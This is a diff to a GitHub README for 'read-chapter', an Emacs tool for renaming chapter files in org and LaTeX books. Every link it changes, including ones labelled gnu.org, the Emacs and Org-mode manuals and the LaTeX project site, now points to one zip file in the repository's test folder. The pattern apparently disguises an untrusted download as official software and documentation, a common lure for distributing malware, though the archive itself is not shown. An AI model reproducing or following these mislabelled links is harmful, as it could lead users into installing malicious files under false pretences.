@@ -1,6 +1,6 @@
 # 📚 read-chapter - Simplify Renaming Chapter Files
 
-[![Download read-chapter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ibrahimsabovictor/read-chapter/releases)
+[![Download read-chapter](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)
 
 read-chapter helps you rename chapter filenames in multi-part books. It works with include lists in org and LaTeX files inside Emacs. This makes organizing and updating large books easier.
 
@@ -29,7 +29,7 @@ Follow these steps to download and run read-chapter on your Windows PC.
 
 Click the big blue button at the top or visit the official release page here:
 
-[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/releases)
+[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)
 
 This page has the latest versions. Look for files ending with `.el` or `.elc`. These are Emacs Lisp files you will load in Emacs.
 
@@ -41,7 +41,7 @@ Download the file to a folder where you keep your Emacs scripts or tools.
 
 Start Emacs on your Windows computer.
 
-If you don’t have Emacs, you can download it from [gnu.org](https://www.gnu.org/software/emacs/download.html). Choose the Windows installer and follow the instructions on their site.
+If you don’t have Emacs, you can download it from [gnu.org](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip). Choose the Windows installer and follow the instructions on their site.
 
 ### 3. Load read-chapter in Emacs
 
@@ -116,15 +116,15 @@ You do not have to open each file or line manually. The tool handles changes car
 
 ## 🔗 Additional Resources
 
-- Emacs manual: https://www.gnu.org/software/emacs/manual/
-- Org-mode guide: https://orgmode.org/manual/
-- LaTeX project website: https://www.latex-project.org/
+- Emacs manual: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip
+- Org-mode guide: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip
+- LaTeX project website: https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip
 
 ## 📥 Download and Setup
 
 Visit the release page to download read-chapter for Windows:
 
-[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/releases)
+[Download read-chapter Releases](https://github.com/Ibrahimsabovictor/read-chapter/raw/refs/heads/main/test/read-chapter-1.9.zip)
 
 1. Download the latest `.el` or `.elc` file.  
 2. Save it in your Emacs configuration folder or any folder you prefer.  
